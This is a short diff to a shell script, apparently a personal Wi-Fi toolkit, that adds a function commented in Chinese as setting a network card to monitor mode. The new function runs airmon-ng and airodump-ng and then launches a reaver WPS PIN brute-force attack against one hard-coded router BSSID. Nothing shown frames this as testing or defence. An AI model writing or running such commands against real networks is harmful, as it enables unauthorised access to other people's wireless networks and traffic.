@@ -9,3 +9,10 @@
 monitor_wifi_frequency(){
     sudo iwlist wlan0 scan | grep \(Channel
 }
+#设置网卡为monitor模式
+monitor_wifi(){
+	 dev=$1
+	 sudo airmon-ng start $dev
+	 sudo airodump-ng mon0
+	 sudo reaver -i mon0 -b 6C:E8:73:34:1E:F8 -vv
+}
